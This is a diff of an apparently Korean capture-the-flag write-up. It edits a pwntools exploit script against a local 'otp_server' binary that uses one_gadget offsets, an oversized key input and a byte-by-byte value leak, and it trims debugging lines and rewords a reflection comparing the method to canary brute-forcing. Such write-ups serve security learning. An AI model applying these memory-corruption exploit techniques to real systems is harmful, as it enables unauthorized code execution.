@@ -200,17 +200,10 @@ int main(void) {
 ```python
 from pwn import *
 
-
 p = process('./otp_server')
 
 sla = lambda c, s : p.sendlineafter(c, str(s))
 sa = lambda c,s : p.sendafter(c, str(s))
-
-context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
-#context.log_level = 'debug'
-script = '''
-
-'''
 
 onegadget_offset = [0x4f365, 0x4f3c2, 0x10a45c]
 
@@ -258,11 +251,7 @@ def main():
     log.info('onegadget_addr : ' + hex(onegadget_addr))
     
     
-    
     set_key('b'*0x14 + '\x00'*(0x100-0x14))
-    
-    script += "b* " + hex(pie_base + 0xb93)
-    script += "\nb* " + hex(pie_base + 0xdcc)
     
     for i in range(4):
     
@@ -277,7 +266,6 @@ def main():
                 log.info('enc_val : ' + hex(enc_val))
                 break
             
-    gdb.attach(p,script)
     exit()
     
     p.interactive()
@@ -291,13 +279,9 @@ if __name__ == '__main__':
 ```
 
 
-if __name__ == '__main__':
-    main()
-
-
 ## 느낀 점
 
-- 느낌이 canary 1byte씩 알아내는거랑 비슷했다.
+- RET overwrite 할때 canary 1byte씩 알아내는거랑 비슷했다.
 
 ## Reference
 
